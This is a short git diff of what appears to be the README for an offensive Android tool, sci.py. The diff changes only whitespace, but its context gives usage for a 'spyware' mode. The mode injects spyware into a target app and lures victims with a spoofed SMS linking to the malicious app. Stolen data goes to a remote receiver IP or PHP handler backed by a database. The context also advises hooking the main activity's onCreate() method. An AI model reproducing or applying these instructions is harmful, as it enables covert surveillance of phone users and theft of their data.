@@ -44,7 +44,7 @@ Spyware usage:
 
 		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -ppg [spoofed_SMS]
     
-    	[-ppg]:	link with the malicious app. 
+	[-ppg]:	link with the malicious app. 
 	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php - do not forget to change the settings to connect to your DB -).
 
 *Advice*: Inject the Spyware on the **onCreate()** method of the main activity.
